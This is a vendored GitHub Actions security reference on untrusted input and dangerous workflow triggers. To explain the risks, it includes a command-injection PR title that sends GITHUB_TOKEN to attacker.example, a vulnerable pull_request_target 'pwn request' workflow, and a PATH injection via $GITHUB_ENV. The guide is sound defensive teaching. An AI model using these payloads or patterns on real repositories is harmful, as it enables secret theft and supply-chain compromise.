<!--
Vendored from https://github.com/konstruktoid/agent-instructions-skills
skills/github/github-actions-security/references/untrusted-input.md
Upstream commit: a05445ea232a635d1803138a365d7a6868d693d2
Do not edit locally; re-vendor from upstream instead.
-->

# Untrusted Input and Dangerous Triggers

Read this when a workflow reads event data, or uses `pull_request_target`, `workflow_run`, or a
comment-driven trigger.

## Why `${{ }}` in a `run:` block is dangerous

The runner substitutes expressions into the script text before the shell interprets it. A value
containing shell metacharacters becomes shell code. This is template injection, and it runs with the
job's token and secrets.

Vulnerable:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

A pull request titled `a"; curl -s https://attacker.example/$(echo $GITHUB_TOKEN); echo "` executes
the attacker's command.

Safe, by passing through the environment so the value never reaches the script generator:

```yaml
- name: Report the title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: printf '%s\n' "$PR_TITLE"
```

Quote the variable. `echo $PR_TITLE` is still subject to word splitting and globbing, which is a bug
even when it is not a vulnerability.

Safer still, pass the value to an action as an input, where it is data rather than script text:

```yaml
- uses: octo-org/check-title@<full-sha> # v1.2.3
  with:
    title: ${{ github.event.pull_request.title }}
```

The same rule applies to `actions/github-script`. Its `script:` field is JavaScript assembled the
same way; read values from `process.env`, not from `${{ }}`.

## Untrusted contexts

Anything a fork author or an unauthenticated user controls is untrusted. The recurring ones:

- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`, `.head.repo.*`
- `github.event.issue.title`, `.body`
- `github.event.comment.body`, `github.event.review.body`,
  `github.event.review_comment.body`
- `github.event.commits[*].message`, `github.event.head_commit.message`,
  `github.event.commits[*].author.email` and `.name`
- `github.event.discussion.title`, `.body`, `github.event.workflow_run.head_branch`
- `github.head_ref`, and any `github.event.inputs.*` from `workflow_dispatch`
- The contents of any file in the checked-out branch, including `package.json` scripts, `Makefile`
  targets, and pre-commit hooks

A branch name is user-controlled and can contain shell metacharacters. So can a commit author name.
Do not use either to build a path, a tag, or a command.

## Trigger risk

| Trigger | Runs in | Token and secrets | Notes |
|---|---|---|---|
| `pull_request` | Fork's merge ref | Read-only token, no secrets for fork PRs | The safe default for validating contributions |
| `pull_request_target` | Base repository | The workflow's configured `permissions`; secrets reachable | Never check out fork code here |
| `workflow_run` | Base repository | The workflow's configured `permissions`; secrets reachable | Artifacts from the triggering run are untrusted |
| `issue_comment`, `issues` | Base repository | The workflow's configured `permissions`; secrets reachable | Body is attacker-controlled; author may be anyone |
| `push`, `schedule`, `workflow_dispatch` | Base repository | The workflow's configured `permissions`; secrets reachable | `workflow_dispatch` inputs are still user data |

"Secrets reachable" means the job can read any secret it names in `secrets.*`, not that every
secret is injected: only the ones the workflow references reach the environment. The token's scopes
are whatever `permissions` resolved to for that job, which is why the read-only default and a
per-job `permissions` block do real work here. What separates these rows from a fork
`pull_request` is that the job runs in a privileged context at all, while still reading data an
outsider controls.

### `pull_request_target`

It runs the workflow file from the base branch, with the base repository's token and secrets, on an
event caused by a fork. That combination is safe only while no fork-controlled code executes.

The dangerous pattern, sometimes called a pwn request:

```yaml
on: pull_request_target

jobs:
  build:
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # fork code
      - run: npm ci                                        # runs fork's install scripts
```

`npm ci`, `pip install -r requirements.txt`, `make`, a test suite, a linter with a plugin config,
and a build script are all fork-controlled code execution.

Rules:

- Prefer `pull_request`. Reach for `pull_request_target` only when the workflow genuinely must
  comment, label, or read a secret on a fork pull request.
- If it is used, do not check out the pull request head at all. Operate on event metadata only.
- If the pull request's files really must be inspected, do it in a `pull_request` job with no
  secrets, upload the result as an artifact, and consume it from a separate privileged workflow that
  treats the artifact as untrusted input.
- Never combine `pull_request_target` with `permissions` beyond what the specific action needs, and
  never with a checkout that lacks `persist-credentials: false`.

### `workflow_run`

It runs privileged after another workflow finishes, and inherits the main branch's cache. Its inputs
are artifacts and metadata produced by a run that may have been untrusted.

- Filter on the source workflow and on `github.event.workflow_run.conclusion == 'success'`, and on
  branch where applicable.
- Download artifacts into `$RUNNER_TEMP`, not the workspace, and validate structure and size before
  reading. Treat file names inside an artifact as hostile; a zip entry can contain path traversal.
- Never `eval`, source, or write an artifact's contents into `$GITHUB_ENV`, `$GITHUB_OUTPUT`, or
  `$GITHUB_PATH`. A line such as `PATH=/tmp/evil` written to `$GITHUB_ENV` takes effect for every
  later step.
- Prefer `workflow_call` with a reusable workflow when the goal is composition rather than reacting
  to an untrusted run.

### Comment-driven triggers

`issue_comment` fires on any comment from anyone, including on a pull request from a fork, and runs
the workflow file from the default branch with that workflow's configured `permissions` and with
the repository's secrets reachable.

- Check the commenter's association explicitly before doing anything:
  `github.event.comment.author_association` in `OWNER`, `MEMBER`, or `COLLABORATOR`. Do not rely on
  the comment body alone.
- Resolve the pull request head to an immutable SHA and use that, rather than a branch name that can
  change between the comment and the checkout.
- A label applied by a maintainer is a better trigger than a comment, because applying it already
  requires write access.

## Fork pull request settings

In Settings, Actions, General:

- **Require approval for first-time contributors** is the minimum. Prefer **require approval for all
  outside collaborators** on any repository with sensitive workflows.
- Approval means a maintainer has read the diff. Review what the pull request changes under
  `.github/`, and what it changes in build and test scripts, before approving a run.
- Add `.github/workflows/` to `CODEOWNERS` so workflow changes need a designated reviewer.

## Checklist

- [ ] No `${{ }}` interpolation of event data inside `run:`, `script:`, or a shell argument
- [ ] Values passed through `env:` are quoted at every use
- [ ] `pull_request` used instead of `pull_request_target` unless a stated reason applies
- [ ] No `pull_request_target` or `workflow_run` job checks out or executes fork-controlled code
- [ ] `workflow_run` filters on source workflow, conclusion, and branch; artifacts validated in
      `$RUNNER_TEMP` and never written to `$GITHUB_ENV`
- [ ] Comment-driven workflows check `author_association` and pin to a resolved commit SHA
- [ ] Fork pull request approval is required, and `.github/workflows/` is covered by `CODEOWNERS`
